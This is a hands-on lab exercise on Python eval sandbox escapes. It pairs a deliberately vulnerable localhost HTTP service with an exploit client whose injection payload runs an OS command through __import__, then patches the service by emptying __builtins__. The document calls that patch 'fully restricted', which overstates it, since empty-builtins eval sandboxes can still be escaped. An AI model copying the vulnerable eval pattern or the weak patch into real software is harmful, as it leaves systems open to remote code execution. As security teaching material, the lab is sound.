---
title: Sandbox Isolation Practice
---

This practice extends the sandboxing concepts from your prior activity by showing how dynamic evaluation can unintentionally expose host capabilities. You will observe a vulnerable evaluator, attempt a controlled exploit, and apply a targeted patch to restore strict separation between evaluated code and the host environment.

## Getting Started

This exercise uses Python and its standard library to implement a small local service and a simple exploit client. No external dependencies are required. You will run the target program on your development machine and interact with it from a separate exploit script on the same machine over localhost. The goal is to understand how a permissive evaluation context can leak host capabilities into user-provided code and how a conservative evaluation strategy prevents those leaks.

### Virtual Environment

A virtual environment creates an isolated Python workspace where you can install and manage packages without affecting anything else on your system. It is not required for this practice, but it is strongly recommended because it gives you a clean and consistent setup. Using a virtual environment helps avoid conflicts and makes it easier to remove or reset dependencies later. You may continue without one, but adopting virtual environments early is a valuable habit.

```bash
# Create a Virtual Environment
python -m venv .venv
```

```bash
# Activate the Virtual Environment
# On Windows
.\.venv\Scripts\activate

# On macOS or Linux
source .venv/bin/activate
```

```bash
# Deactivate the Virtual Environment
deactivate
```

### Install Requirements

No external dependencies are required for this practice. The target and exploit programs use Python's standard library to implement a minimal HTTP API and a simple client. If you prefer a richer HTTP client, you may install the requests library, but it is not necessary for the core demonstration.

```bash
# Optional: install requests (not required for core demonstration)
pip install requests
```

## Scenario Overview

The scenario centers on a local DataTransformer service. Its job is straightforward: accept a JSON payload containing a data payload and a field called expression, evaluate the expression against the in-memory data, and return the transformed result. The evaluator is intended to sandbox user-provided expressions so that they can manipulate data without accessing the host file system or runtime APIs. The dataset resides in memory for the duration of the session, and the execution environment is isolated from the host. However, if the sandbox is not properly constrained, a user-supplied expression could escape the sandbox and reach host resources.

The Exploit Client is a lightweight local component that talks to the Target program via localhost. It crafts requests that supply malicious expressions designed to escape the sandbox by abusing the evaluation binding or by referencing restricted host capabilities. The client operates on the same machine, mirroring how an attacker on a compromised host might attempt to leverage a vulnerable server.

### Target Program

The Target Program exposes a tiny HTTP API that accepts a JSON payload with two fields: data and expression. The service evaluates the expression against the in-memory data and returns the transformed result. The vulnerability lies in the evaluation step: the sandbox is insufficiently constrained, allowing the expression to access host objects or execute host commands when certain bindings are exposed to the evaluation context.

```python
# target.py: Vulnerable DataTransformer service
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

# In-memory dataset for the session
DATASET = {
    'numbers': [1, 2, 3, 4, 5],
    'text': 'hello world'
}

# Vulnerable evaluator: exposes a binding that can reach host capabilities
# The sandbox is intentionally lax to illustrate the risk of this pattern.
def evaluate_expression(expression, data):
    # Vulnerable: the expression is evaluated with access to a restricted globals
    # that still permits __import__ via the builtins, allowing host access.
    safe_globals = {
        '__builtins__': {
            '__import__': __import__,  # attacker can import modules like os, subprocess, etc.
        }
    }
    return eval(expression, safe_globals, {'data': data})

class TransformHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != '/transform':
            self.send_error(404, 'Not Found')
            return
        length = int(self.headers.get('Content-Length', 0))
        payload = json.loads(self.rfile.read(length).decode())
        data = payload.get('data', DATASET)
        expression = payload.get('expression', '')
        try:
            result = evaluate_expression(expression, data)
            response = {'result': result}
        except Exception as e:
            response = {'error': str(e)}
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

def run_server():
    httpd = HTTPServer(('localhost', 8000), TransformHandler)
    print('Serving on http://localhost:8000/transform')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

### Exploit Program

The Exploit Client interacts with the Target program over localhost. It crafts requests containing a malicious expression designed to escape the sandbox by abusing the evaluation context. On a vulnerable system, the exploit could trigger host-level access or command execution. The client is intentionally simple: it sends a single request and prints the server's response, illustrating how the vulnerability manifests in a real-world lab environment.

```python
# exploit.py: Exploit client to trigger sandbox escape on the vulnerable target
import json
import urllib.request

payloads = [
    {
        'data': {'numbers': [1, 2, 3]},
        # Malicious expression attempting to escape the sandbox via __import__
        'expression': "__import__('os').system('echo sandbox_breach')"
    },
    {
        'data': {'numbers': [1, 2, 3]},
        'expression': "data['numbers'][0] + 42"  # benign expression for baseline test
    }
]

for p in payloads:
    req = urllib.request.Request(
        'http://localhost:8000/transform',
        data=json.dumps(p).encode(),
        headers={'Content-Type': 'application/json'}
    )
    with urllib.request.urlopen(req) as resp:
        print('Response for expression:', p['expression'])
        print(resp.read().decode())
        print('-' * 60)
```

## Practice Objectives

### Task 1: Observe the vulnerable behavior

Describe how a benign expression is processed by the API and how the service returns a transformed result. The goal is to establish a baseline to compare against after applying safeguards.

```python
# Example benign expression payload (baseline)
payload = {
    'data': {'numbers': [1, 2, 3]},
    'expression': "data['numbers'][0] * 2"
}
```

### Task 2: Trigger the vulnerability

Submit a crafted malicious expression to the API path that attempts to access host resources or execute a system command. This demonstrates that the sandbox does not properly confine the execution context.

```python
# Exploit attempt (expression)
expr = "__import__('os').system('echo sandbox_breach')"
payload = {'data': {'numbers': [1, 2, 3]}, 'expression': expr}
```

### Task 3: Patch Tasks

Implement a single patch across the evaluator to disallow access to host objects via this binding, or to completely constrain the evaluation context so that privileged APIs are never reachable. The patch options include tightening the global evaluation context, removing or replacing __import__ access, or replacing eval with a safer evaluation strategy such as a restricted AST-based sandbox. Apply the patch to target.py and document the rationale behind your choice. A straightforward patch is to remove any exposure of builtins that could enable imports and restrict what the expression can reference.

```python
# Patch option: constrain evaluation context to disallow imports

def evaluate_expression(expression, data):
    # Fully restricted globals with no access to __builtins__ or imports
    safe_globals = {'__builtins__': {}}
    return eval(expression, safe_globals, {'data': data})
```

### Task 4: Patch Tasks verification

Verify the patch by re-sending the same malicious expression and confirming it is blocked or evaluated to a safe, empty, or predictable result. Re-run the exploit client against the patched evaluator. The results should no longer show evidence of sandbox escape, and the server should respond with an error or a safe default.

```python
# Re-attempt after patch
# Expression: __import__('os').system('echo sandbox_breach')
# Expected outcome: error or blocked response from the server, e.g., {'error': 'Access to host resources is blocked'}
```
